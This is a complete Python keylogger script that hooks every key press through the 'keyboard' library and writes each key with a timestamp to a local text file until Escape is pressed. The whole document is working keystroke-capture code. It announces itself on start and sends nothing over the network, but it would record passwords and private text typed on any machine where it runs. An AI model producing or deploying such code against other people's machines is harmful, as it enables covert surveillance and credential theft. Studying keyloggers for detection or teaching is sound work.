import keyboard       
import datetime       
import os               

# file being logged to
LOG_FILE = "keystroke_log.txt"

def log_keystroke(key):

    # get current time
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # get key name
    key_name = key.name if hasattr(key, 'name') else str(key)

    # write to file
    with open(LOG_FILE, 'a') as f:
        f.write(f"[{current_time}] Key pressed: {key_name}\n")
        

def main():
    print("Starting keylogger. Press 'esc' to stop.")
    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)

    # hook all key presses to the log_keystroke function
    keyboard.on_press(log_keystroke)
    keyboard.wait('esc')
    
    print("Keylogger stopped")

if __name__ == "__main__":
    main()
